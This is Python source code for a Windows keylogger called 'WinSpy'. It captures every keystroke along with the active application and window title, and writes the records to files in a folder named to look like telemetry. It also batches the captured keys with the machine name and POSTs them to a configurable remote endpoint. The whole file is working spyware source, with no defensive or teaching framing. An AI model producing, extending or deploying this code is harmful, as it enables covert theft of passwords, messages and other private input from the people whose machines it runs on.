import os
import logging
import psutil
import win32gui
import win32process
from enum import Enum, auto
from threading import Event, Lock
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError as exc:
    raise ImportError("missing pynput. run: pip install pynput") from exc

try:
    import requests
except ImportError:
    requests = None

MB_BYTES = 1024 * 1024
NET_TIMEOUT = 5
POLL_RATE = 0.5
THREAD_WAIT = 1.0

KEY_MAP: dict[Key, str] = {
    Key.space: "[SPACE]", Key.enter: "[ENTER]", Key.tab: "[TAB]",
    Key.backspace: "[BACKSPACE]", Key.delete: "[DEL]",
    Key.shift: "[SHIFT]", Key.shift_r: "[SHIFT]",
    Key.ctrl: "[CTRL]", Key.ctrl_r: "[CTRL]",
    Key.alt: "[ALT]", Key.alt_r: "[ALT]",
    Key.cmd: "[WIN]", Key.cmd_r: "[WIN]",
    Key.esc: "[ESC]", Key.up: "[UP]", Key.down: "[DOWN]",
    Key.left: "[LEFT]", Key.right: "[RIGHT]",
}

class StrokeType(Enum):
    TEXT = auto()
    META = auto()
    ANOMALY = auto()

@dataclass
class WinLoggerSettings:
    out_dir: Path = Path.home() / ".win_telemetry"
    file_prefix: str = "win_trace"
    max_mb: float = 5.0
    endpoint: str | None = None
    batch_limit: int = 50
    killswitch: Key = Key.f9
    track_windows: bool = True
    record_meta: bool = True
    poll_interval: float = POLL_RATE

@dataclass
class StrokeRecord:
    ts: datetime
    char: str
    active_app: str | None = None
    stroke_type: StrokeType = StrokeType.TEXT

    def serialize(self) -> dict[str, str]:
        return {
            "time": self.ts.isoformat(),
            "stroke": self.char,
            "app": self.active_app or "unknown",
            "type": self.stroke_type.name.lower(),
        }

    def format_log(self) -> str:
        t_str = self.ts.strftime("%Y-%m-%d %H:%M:%S")
        app_ctx = f" [{self.active_app}]" if self.active_app else ""
        return f"[{t_str}]{app_ctx} {self.char}"

class WinContext:
    @staticmethod
    def get_foreground_app() -> str | None:
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            proc = psutil.Process(pid)
            title = win32gui.GetWindowText(hwnd)
            return f"{proc.name()} - {title}" if title else proc.name()
        except Exception:
            return None

class DiskWriter:
    def __init__(self, cfg: WinLoggerSettings):
        self.cfg = cfg
        cfg.out_dir.mkdir(parents=True, exist_ok=True)
        self.active_file = self._generate_path()
        self._mutex = Lock()
        self._fd = open(self.active_file, 'a', encoding='utf-8')

    def _generate_path(self) -> Path:
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        return self.cfg.out_dir / f"{self.cfg.file_prefix}_{stamp}.txt"

    def commit(self, record: StrokeRecord) -> None:
        with self._mutex:
            self._fd.write(record.format_log() + '\n')
            self._fd.flush()
            self._enforce_limits()

    def _enforce_limits(self) -> None:
        try:
            if (self.active_file.stat().st_size / MB_BYTES) >= self.cfg.max_mb:
                self._cycle_file()
        except FileNotFoundError:
            self._cycle_file()

    def _cycle_file(self) -> None:
        self._fd.close()
        self.active_file = self._generate_path()
        self._fd = open(self.active_file, 'a', encoding='utf-8')

    def shutdown(self) -> None:
        with self._mutex:
            self._fd.close()

class NetSink:
    def __init__(self, cfg: WinLoggerSettings):
        self.cfg = cfg
        self.queue: list[StrokeRecord] = []
        self.mutex = Lock()
        self.active = bool(cfg.endpoint and requests)

    def push(self, record: StrokeRecord) -> None:
        if not self.active:
            return

        payload = None
        with self.mutex:
            self.queue.append(record)
            if len(self.queue) >= self.cfg.batch_limit:
                payload = self.queue
                self.queue = []

        if payload:
            self._transmit(payload)

    def _transmit(self, batch: list[StrokeRecord]) -> None:
        if not batch or not self.cfg.endpoint:
            return

        data = {
            "timestamp": datetime.now().isoformat(),
            "machine": os.environ.get('COMPUTERNAME', 'unknown_win_host'),
            "data": [r.serialize() for r in batch],
        }

        try:
            res = requests.post(self.cfg.endpoint, json=data, timeout=NET_TIMEOUT)
            if not res.ok:
                logging.warning(f"sink rejected payload: {res.status_code}")
        except Exception:
            logging.error("transmission failure", exc_info=True)

    def drain(self) -> None:
        payload = None
        with self.mutex:
            if self.queue:
                payload = self.queue
                self.queue = []
        if payload:
            self._transmit(payload)

class WinSpy:
    def __init__(self, cfg: WinLoggerSettings):
        self.cfg = cfg
        self.writer = DiskWriter(cfg)
        self.sink = NetSink(cfg)
        self.ctx = WinContext()

        self.alive = Event()
        self.recording = Event()
        self.hook: keyboard.Listener | None = None

        self._last_app: str | None = None
        self._last_poll = datetime.now()

    def _refresh_context(self) -> None:
        if not self.cfg.track_windows:
            return

        now = datetime.now()
        if (now - self._last_poll).total_seconds() >= self.cfg.poll_interval:
            self._last_app = self.ctx.get_foreground_app()
            self._last_poll = now

    def _parse_stroke(self, key: Key | KeyCode) -> tuple[str, StrokeType]:
        if isinstance(key, Key):
            return KEY_MAP.get(key, f"[{key.name.upper()}]"), StrokeType.META
        if hasattr(key, 'char') and key.char:
            return key.char, StrokeType.TEXT
        return "[?]", StrokeType.ANOMALY

    def _handle_stroke(self, key: Key | KeyCode) -> None:
        if key == self.cfg.killswitch:
            self._flip_state()
            return

        if not self.recording.is_set():
            return

        self._refresh_context()
        char_str, s_type = self._parse_stroke(key)

        if s_type == StrokeType.META and not self.cfg.record_meta:
            return

        rec = StrokeRecord(
            ts=datetime.now(),
            char=char_str,
            active_app=self._last_app,
            stroke_type=s_type,
        )

        self.writer.commit(rec)
        self.sink.push(rec)

    def _flip_state(self) -> None:
        btn = self.cfg.killswitch.name.upper()
        if self.recording.is_set():
            self.recording.clear()
            print(f"\n[-] suspended. hit {btn} to resume.")
        else:
            self.recording.set()
            print(f"\n[+] active. hit {btn} to suspend.")

    def execute(self) -> None:
        btn = self.cfg.killswitch.name.upper()
        print("win_spy initialized")
        print(f"out: {self.cfg.out_dir}")
        print(f"hotkey: {btn}")
        print(f"net sink: {'online' if self.sink.active else 'offline'}\n")

        self.alive.set()
        self.recording.set()

        self.hook = keyboard.Listener(on_press=self._handle_stroke)
        self.hook.start()

        try:
            while self.alive.is_set():
                self.hook.join(timeout=THREAD_WAIT)
        except KeyboardInterrupt:
            self.terminate()

    def terminate(self) -> None:
        print("\n[!] tearing down...")
        self.alive.clear()
        self.recording.clear()
        
        if self.hook:
            self.hook.stop()

        self.sink.drain()
        self.writer.shutdown()
        print("[+] clean exit.")

if __name__ == "__main__":
    agent = WinSpy(WinLoggerSettings())
    try:
        agent.execute()
    except Exception as e:
        print(f"\n[x] fatal: {e}")
        agent.terminate()
```
